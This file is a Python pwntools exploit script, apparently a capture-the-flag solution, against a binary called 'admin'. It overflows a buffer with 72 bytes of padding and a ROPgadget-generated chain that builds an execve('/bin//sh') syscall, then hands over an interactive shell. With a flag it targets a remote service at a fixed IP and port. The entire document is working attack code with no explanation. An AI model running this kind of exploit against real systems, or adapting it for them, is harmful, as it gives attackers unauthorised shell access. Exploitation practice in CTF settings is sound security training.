#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from struct import pack

e = ELF("./admin")
context.binary = e
#context.log_level = 'debug'

if "--tmux" in sys.argv:
	context.terminal = ['tmux','new-window']
else:
	context.terminal = ['terminator','-e']

if "--remote" in sys.argv:
	r = remote("35.186.153.116",7002)
else:
	r = process([e.path])

# Use ROPgadget to generate ROP payload: `ROPgadget --binary admin --ropchain`
p = b''
p += pack('<Q', 0x0000000000410193) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x0000000000415544) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000047f321) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000410193) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444aa0) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f321) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x0000000000410193) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000449765) # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444aa0) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000474770) # add rax, 1 ; ret
p += pack('<Q', 0x000000000040123c) # syscall

payload = b'A'*72 + p 
r.sendline(payload)
r.interactive()